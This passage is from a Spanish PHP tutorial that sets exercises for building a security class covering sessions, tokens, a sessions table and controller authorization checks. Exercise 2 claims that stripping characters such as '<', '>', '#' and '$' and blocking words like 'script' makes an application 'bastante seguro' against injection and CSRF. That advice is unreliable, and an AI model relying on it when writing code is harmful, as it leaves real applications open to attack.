+                    <span class="k">while</span> <span class="p">(</span><span class="nv">$permission</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_object</span><span class="p">())</span> <span class="p">{</span>
+                        <span class="nv">$resultArray</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$permission</span><span class="p">;</span>
+                    <span class="p">}</span>
+                <span class="p">}</span>
+                <span class="k">else</span> <span class="p">{</span>
+                    <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+            <span class="k">else</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
+            <span class="p">}</span>
+
+        <span class="p">}</span>
+   <span class="p">}</span>
+ <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h2 id="36-ejercicios-propuestos">3.6. Ejercicios propuestos</h2>
+
+<p>Vamos a terminar este tema con una batería de ejercicios propuestos, que consistirán en una serie de mejoras sobre nuestra implementación de las listas de control de acceso.</p>
+
+<p>Ten en cuenta que lo que hagas aquí se puede reutilizar en posteriores proyectos de aplicaciones web, así que vamos a tomárnoslo en serio, ¿te parece?</p>
+
+<h4 id="ejercicio-1-crear-la-capa-de-seguridad">Ejercicio 1. Crear la capa de seguridad</h4>
+
+<p>Si te fijas en el código fuente, hemos accedido en varios puntos al array superglobal <em>$_SESSION</em>. Más arriba dijimos que las variables de sesión de PHP no son completamente seguras. Confiar nuestro mecanismo de autenticación a esas variables es como jugar a la ruleta rusa.</p>
+
+<p>¿Y si queremos cambiarlo? Por ejemplo, por <em>cookies</em>. Vale, las <em>cookies</em> tampoco son muy seguras, pero la pregunta sigue siendo la misma: ¿y si queremos cambiar la forma en la que se almacena el ID del usuario logueado tras la autenticación?</p>
+
+<p>La única manera es <em>revisar TOOOODO el código fuente</em> y cambiar las referencias a <em>$_SESSION</em> por <em>$_COOKIE</em> (o el mecanismo que hayamos elegido para sustituir a las variables de sesión). Y, si pretendemos mejorar la seguridad de la aplicación, no solo sustituirla, lo mismo: ponte a revisar todo tu código una y otra vez.</p>
+
+<p>Por eso suele construirse una <strong>capa de seguridad</strong>. Que es lo que te propongo hacer ahora.</p>
+
+<p>La capa de seguridad no es más que una clase (podemos llamarla <em>Seguridad</em> o <em>Security</em>) guardada en un archivo aparte que contendrá una colección de métodos para gestionar la seguridad de la aplicación. Así, cada vez que queramos cambiar algo en la forma se protege de los ataques, solo tendremos que acudir a esa clase y tocar aquí o allí, como en una intervención quirúrjica muy localizada.</p>
+
+<p>Así que, en este ejercicio, te pido crear una clase <em>Seguridad</em> (o <em>Security</em>) que contenga, para empezar, estos métodos:</p>
+
+<ul>
+  <li><strong>openSession()</strong>: para abrir una sesión de usuario cuando alguien se loguee correctamente. Este método seguirá usando una variable de sesión de PHP (ya lo cambiaremos después). Por ahora, solo queremos centralizar en esta clase el manejo de sesiones y seguridad.</li>
+  <li><strong>getUserId()</strong>: devuelve el ID del usuario logueado (si existe).</li>
+  <li><strong>getUserRoles()</strong>: devuelve un array con los roles del usuario logueado (si existe)</li>
+  <li><strong>getUserPermissions()</strong>: devuelve un array con los permisos del usuario logueado (si existe)</li>
+</ul>
+
+<p>Cuando tengas hecha esa clase, sustituye cualquier referencia a $_SESSION en el código fuente de nuestro caso práctico (ver sección anterior) por llamadas a métodos de esta clase, hasta que el programa funcione exactamente igual que antes, pero con la clase Seguridad integrada en él.</p>
+
+<h4 id="ejercicio-2-filtrar-los-datos-de-entrada">Ejercicio 2. Filtrar los datos de entrada</h4>
+
+<p>Añade un nuevo método en la clase <em>Seguridad</em> que puedes llamar <strong><em>filter()</em></strong>.</p>
+
+<p>Este método recibirá un <em>string</em> y lo devolverá filtrado, es decir, limpio de cualquier carácter o palabra sospechosa.</p>
+
+<p>Puedes empezar por eliminar los caracteres especiales como “&lt;”, “&gt;”, “#” o “$”, señal de que alguien puede estar intentando inyectar Javascript, SQL o tratando de atacar mediante CSRF. Con eso ya irás bastante seguro.</p>
+
+<p>Luego busca todos los puntos de la aplicación donde se accede a las variables de la URL sin filtro (es decir, los puntos donde se usa $_REQUEST, $_GET o $_POST) y llama al método <em>filter()</em> antes de acceder a esas variables.</p>
+
+<p>Más adelante, puedes mejorar la función de filtrado localizando palabras como “script”, “location.href” o similares. Lo bueno de esta solución es que no tendrás que tocar el resto del programa: al tener la función de filtrado encapsulada en la clase <em>Seguridad</em>, cualquier mejora posterior afectará a toda la aplicación sin modificar el código externo a esta clase.</p>
+
+<h4 id="ejercicio-3-cerrar-la-sesión-y-destruir-las-variables">Ejercicio 3. Cerrar la sesión y destruir las variables</h4>
+
+<p>Es algo que no hemos hecho hasta ahora, ¿verdad?</p>
+
+<p>La clase <em>Seguridad</em> debe tener un método para destruir las variables de sesión y cerrar la sesión de un usuario autenticado. Lo podemos llamar <strong><em>closeSession()</em></strong>.</p>
+
+<p>Habrá que añadir una opción “Cerrar sesión” en el menú principal de la aplicación que enlace con una entrada del controlador que, a su vez, invoque este método de la clase <em>Seguridad</em>.</p>
+
+<h4 id="ejercicio-4-añadir-cookies-para-controlar-la-sesión">Ejercicio 4. Añadir cookies para controlar la sesión</h4>
+
+<p>Hemos dicho a lo largo del texto que manejar las sesiones de usuario solo con las variables de sesión de PHP es arriesgado, puesto que un atacante podría suplantar la sesión con relativa facilidad capturando la <em>cookie</em> “phpsessid”.</p>
+
+<p>Para proporcionar a este mecanismo un extra de protección, se pueden crear <em>cookies</em> adicionales que nos den una pista en caso de que se produzca un ataque. Estas <em>cookies</em> se manipulan desde la clase <em>Seguridad</em> de forma transparente al resto del programa. Es decir, el resto de clases ni se enteran de que la seguridad de la aplicación se está incrementando. ¡Es la magia de la programación orientada a objetos!</p>
+
+<p>Las <em>cookies</em> que vamos a crear en este punto son:</p>
+
+<ul>
+  <li>idUsuario: Guardaremos el id del usuario logueado en una <em>cookie</em> además de en una variable de sesión. Cada vez que la clase <em>Seguridad</em> vaya a comprobar algo (los permisos del usuario, por ejemplo), se asegurará de que la <em>cookie</em> y la variable de sesión contienen exactamente el mismo valor. Cualquier discrepancia provocará un cierre de la sesión inmediato.</li>
+  <li>idRol: Haremos lo mismo con el rol del usuario.</li>
+  <li>myToken: Será una <em>cookie</em> con un valor aleatorio que guardaremos en el cliente, al mismo tiempo que crearemos una variable de sesión donde se guardará el mismo valor. Si un atacante suplanta el id de sesión de PHP, probablemente no suplantará este token. En cada operación de la clase <em>Seguridad</em> comprobaremos que los dos tokens coinciden y, si no es así, cerraremos la sesión.</li>
+</ul>
+
+<h4 id="ejercicio-5-añadir-una-tabla-para-controlar-la-sesión">Ejercicio 5. Añadir una tabla para controlar la sesión</h4>
+
+<p>El mecanismo extra de seguridad que hemos implementado en el apartado anterior no es suficiente. Un atacante avispado se percatará antes o después de que hay por ahí pululando una <em>cookie</em> adicional (nuestro token), y terminará suplantándolo.</p>
+
+<p>Para subir un escalón en nuestra protección frente a ataques, necesitamos crear una tabla en la base de datos que tenga más o menos esta estructura:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">IF</span> <span class="k">NOT</span> <span class="k">EXISTS</span> <span class="nv">`MySessions`</span> <span class="p">(</span>
+    <span class="nv">`id`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
+    <span class="nv">`ipAddress`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">45</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
+    <span class="nv">`idUser`</span> <span class="nb">INTEGER</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
+    <span class="nv">`idRol`</span> <span class="nb">INTEGER</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
+    <span class="nv">`token`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
+    <span class="nv">`timestamp`</span> <span class="nb">int</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="nb">unsigned</span> <span class="k">DEFAULT</span> <span class="mi">0</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
+    <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">id</span><span class="p">)</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<p>Cuando un usuario de autentique en la aplicación, crearemos sus variables de sesión y sus <em>cookies</em> como hasta ahora y, además, insertaremos un registro en la tabla <em>MySessions</em> con toda la información de la sesión, a la que añadiremos:</p>
+
+<ul>
+  <li>La IP desde la que el cliente se ha conectado. Curiosea en internet para averiguar cómo se puede obtener este dato.</li>
+  <li>La fecha y hora exacta de esa conexión (a eso se le denomina <em>timestamp</em> o marca de tiempo).</li>
+</ul>
+
+<p>En cualquier operación posterior, la clase <em>Seguridad</em> realizará todas las comprobaciones que ya realizaba hasta ahora y, además, lanzará una consulta a la base de datos para recuperar, mediante el valor del token, el ID del usuario y su rol. Si el token no existe en la base de datos, mal asunto: cerramos la sesión. Y si hay cualquier discrepancia entre los valores de la base de datos, de las variables de sesión y de las cookies, mal asunto también: cerramos la sesión.</p>
+
+<p>La seguridad puede continuar mejorándose indefinidamente. Por ejemplo: si detectamos un posible ataque procedente de una dirección IP, podemos pasarla a una tabla de “direcciones baneadas” e impedir cualquier intento de conexión en el futuro desde esa dirección.</p>
+
+<h4 id="ejercicio-6-limitar-el-acceso-al-controlador-y-completar-la-aplicación">Ejercicio 6. Limitar el acceso al controlador (y completar la aplicación)</h4>
+
+<p>Todo esto está muy bien (aunque te hace volverte un poco paranoico, ¿verdad?), pero, por muchas mejoras en la seguridad que estemos introduciendo, cualquier atacante, incluso sin pasar por el login, puede escribir esto en su navegador y meterse hasta la cocina en nuestra aplicación:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://mi-servidor/index.php?action=showMainMenu
+</code></pre></div></div>
+
+<p>Sustituye “showMainMenu” por cualquier otra cosa (¿qué tal “deleteUser”?) y tienes un problema de los gordos.</p>
+
+<p>Para programar una aplicación web segura necesitamos <strong>proteger los métodos del controlador</strong>, de manera que solo pueda ejecutarlos un usuario autenticado y con los privilegios adecuados.</p>
+
+<p>Fíjate en que cada usuario tendrá acceso a diferentes métodos del controlador, dependiendo de su rol. Por ejemplo, a un método como <em>showMainMenu()</em> podrá acceder cualquier usuario logueado, pero un método como <em>deleteUser()</em> debe estar más limitado y solo los administradores deberían poder ejecutarlo.</p>
+
+<p>Así que tienes que añadir una barrera de entrada en cada método del controlador, en forma de un par de líneas de código que comprueben:</p>
+
+<p>a) Que hay un usuario correctamente autenticado.
+b) Que ese usuario tiene privilegios suficientes para ejecutar este método.</p>
+
+<p>Las dos comprobaciones se hacen invocando métodos de la clase <em>Seguridad</em>. Te dejo a ti pensar cómo se implementa esto exactamente (en realidad, hay varios modos).</p>
+
+<p>Si cualquiera de las dos comprobaciones falla, el usuario verá una pantalla de “Acceso prohibido” o algo por el estilo.</p>
+
+<h4 id="ejercicio-7-actualizar-periódicamente-el-id-de-sesión">Ejercicio 7. Actualizar periódicamente el ID de sesión</h4>
+
+<p>Una técnica de defensa frecuente es modificar el ID de sesión periódicamente (cada pocos minutos, o bien cada vez que se recibe una petición del cliente).</p>
+
+<p>Implementa esta opción en tu aplicación. Te advierto que es lo más complicado que has hecho hasta ahora. Puedes considerar que este es un ejercicio de nivel avanzado.</p>
+
+<h4 id="ejercicio-8-aplicar-a-un-caso-realista">Ejercicio 8. Aplicar a un caso realista</h4>
+
+<p>Por último, vamos a aplicar todas estas mejoras en la seguridad a una aplicación web más completa.</p>
+
+<p>Para ello, utiliza el código fuente de tu Videoclub (la aplicación que programamos en el tema anterior). Si no dispones de ese código, puedes usar el de la Biblioteca. Lo encontrarás en un capítulo anterior de este mismo texto. No es que sea una aplicación muy completa, pero si te servirá para comprobar que la capa de seguridad es muy eficaz contra los ataques más habituales.</p>
+
+<p>Añade la clase <em>Seguridad</em> al código fuente de tu aplicación y sustituye la apertura de la sesión por llamadas a los métodos de la clase <em>Seguridad</em>. Por último, protege todos los accesos al controlador para asegurarte de que solo los usuarios con los privilegios adecuados puede ejecutar ese código.</p>
+
+<p>Y una última advertencia: por mucho que protejas una aplicación web, puedes encontrarte con atacantes que burlen tus medidas de seguridad. La única solución para eso es disponer siempre de un <em>backup</em> de tu código y tu base de datos para restaurarlo todo en caso de catástrofe, así que no dejes de hacer copias con frecuencia (o contrata un proveedor de <em>hosting</em> que las haga por ti).</p>
+:ET
